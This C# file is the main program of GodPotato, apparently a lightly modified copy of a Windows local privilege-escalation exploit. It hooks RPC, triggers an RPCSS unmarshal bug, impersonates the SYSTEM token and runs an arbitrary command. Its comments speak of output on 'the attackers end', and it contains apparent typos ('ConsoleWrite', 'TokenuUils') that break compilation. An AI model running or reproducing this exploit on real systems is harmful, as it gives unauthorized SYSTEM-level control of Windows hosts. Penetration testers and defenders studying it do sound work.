using System;
using System.IO;
using GodPotato.NativeAPI;
using System.Security.Principal;
using SharpToken;
using static GodPotato.ArgsParse;

namespace GodPotato
{
    internal class Program
    {


        class GodPotatoArgs
        {
            [ArgsAttribute("cmd","cmd /c whoami",Description = "CommandLine",Required = true)]
            public string cmd { get; set; }
        }



        static void Main(string[] args)
        {
            TextWriter ConsoleWriter = Console.Out;

            GodPotatoArgs potatoArgs;

            string helpMessage = PrintHelp(typeof(GodPotatoArgs), @"                                                                                               
    FFFFF                   FFF  FFFFFFF                                                       
   FFFFFFF                  FFF  FFFFFFFF                                                      
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
"
, "GodPotato", new string[0]);


            if (args.Length == 0)
            {
                ConsoleWriter.WriteLine(helpMessage);
                return;
            }
            else
            {
                try
                {
                    potatoArgs = ParseArgs<GodPotatoArgs>(args);
                }
                catch (Exception e)
                {
                    if (e.InnerException != null)
                    {
                        e = e.InnerException;
                    }
                    ConsoleWriter.WriteLine("Exception:" + e.Message);
                    ConsoleWriter.WriteLine(helpMessage);
                    return;
                }
            }

            // Execution Logging 
            // WIP - Print on ONLY attackers end
            ConsoleWrite.WriteLine("[+] Mashing 'taters started...");

            try
            {
                GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());

                ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", godPotatoContext.CombaseModule);
                ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", godPotatoContext.DispatchTablePtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", godPotatoContext.UseProtseqFunctionPtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", godPotatoContext.UseProtseqFunctionParamCount);

                ConsoleWriter.WriteLine("[*] HookRPC");
                godPotatoContext.HookRPC();
                ConsoleWriter.WriteLine("[*] Start PipeServer");
                godPotatoContext.Start();

                GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
                try
                {
                    ConsoleWriter.WriteLine("[*] Exploiting RPCSS...");
                    int hr = unmarshalTrigger.Trigger();
                    ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);
                    
                }
                catch (Exception e)
                {
                    // Make Failure more apparent
                    // WIP - Print on ONLY attackers end
                    ConsoleWriter.WriteLine("[X] Trigger Error: " + e.Message);
                }


                WindowsIdentity systemIdentity = godPotatoContext.GetToken();
                if (systemIdentity != null)
                {
                    // Adjust to provide Username ASAP and assess Command Execution
                    ConsoleWriter.WriteLine("[+] Successfully Impersonated User: " + systemIdentity.Name);
                    ConsoleWriter.WriteLine("[#] Executing Command: " + potatoArgs.cmd);
                    
                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);

                    // Inform Person that command ran properly without timing out
                    // WIP - Print on ONLY attackers end
                    ConsoleWriter.WriteLine("[+] Command Execution Completed.");
                }
                else
                {
                    ConsoleWriter.WriteLine("[X] Failed to impersonate security context token");
                }
                godPotatoContext.Restore();
                godPotatoContext.Stop();
            }
            catch (Exception e)
            {
                // Make Failure more clear 
                // // WIP - Print on ONLY attackers end
                ConsoleWriter.WriteLine("[X] FATAL ERROR: " + e.Message);

            }

        }
    }
}
